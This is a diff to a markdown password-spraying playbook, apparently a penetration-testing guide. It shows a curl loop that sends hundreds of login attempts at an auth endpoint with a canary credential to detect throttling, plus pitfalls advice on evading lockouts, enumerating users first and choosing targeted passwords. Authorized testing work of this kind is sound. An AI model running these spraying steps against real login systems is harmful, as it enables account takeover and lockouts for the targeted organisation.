@@ -37,6 +37,10 @@ Password spraying is the highest-ROI credential attack: one (or few) passwords t
 ## How to Run
 
 ```bash
+# Set once per engagement; every step below uses these.
+TARGET="example.com"   # or the engagement target
+export OUTPUT_DIR="${OUTPUT_DIR:-./output}"
+
 # Inject a known-good credential at position 500
 # If it stops working under load, shadow-throttle is active
 # Your "no rate limit" conclusion was false
@@ -45,7 +49,7 @@ for n in $(seq 0 600); do
   creds="user${n}@target.com:WrongP@ss"
   [ $((n % 100)) -eq 0 ] && creds="$KNOWN_GOOD"   # canary: known-good must keep working
   code=$(curl --max-time 30 --connect-timeout 10 -sk -u "$creds" -o /tmp/bf_body -w "%{http_code}" \
-    "https://TARGET/auth-endpoint")
+    "https://$TARGET/auth-endpoint")
   echo "$n $code $(wc -c </tmp/bf_body)"
 done
 # Watch: status flips, time_total climbing, body size changing
@@ -423,6 +427,15 @@ The Smart Lockout math guarantee (1 < 10) doubles as an active-attacker detector
 
 ---
 
+## Pitfalls
+- **Spraying without lockout policy knowledge** — Entra ID Smart Lockout, Okta lockout, and on-prem AD lockout all work differently. Know the threshold before spraying.
+- **One-password spray** — spraying only "Password123" is nearly useless. Use a targeted list of 2-4 high-probability passwords per org.
+- **Spray without user enumeration first** — validating usernames before spraying reduces noise and lockout risk. Always enum first.
+- **Timing-based account validation** — password spray timing differentials can confirm valid accounts. Measure carefully with n>=10 samples.
+- **OAuth/Modern Auth spray** — modern auth endpoints (OAuth2 token endpoint) have different lockout behavior than legacy endpoints. Test both paths.
+
+---
+
 ## Verification
 
 1. **Spray tool availability** — confirm spray tools:
@@ -431,16 +444,6 @@ The Smart Lockout math guarantee (1 < 10) doubles as an active-attacker detector
    pip3 show o365spray 2>/dev/null | grep -q "Name:" && echo "PASS: o365spray installed" || echo "NOTE: o365spray not installed"
    ```
 All tests verify password spray readiness.
-
----
-
-## Pitfalls
-- **Spraying without lockout policy knowledge** — Entra ID Smart Lockout, Okta lockout, and on-prem AD lockout all work differently. Know the threshold before spraying.
-- **One-password spray** — spraying only "Password123" is nearly useless. Use a targeted list of 2-4 high-probability passwords per org.
-- **Spray without user enumeration first** — validating usernames before spraying reduces noise and lockout risk. Always enum first.
-- **Timing-based account validation** — password spray timing differentials can confirm valid accounts. Measure carefully with n>=10 samples.
-- **OAuth/Modern Auth spray** — modern auth endpoints (OAuth2 token endpoint) have different lockout behavior than legacy endpoints. Test both paths.
-
 
 ---
 
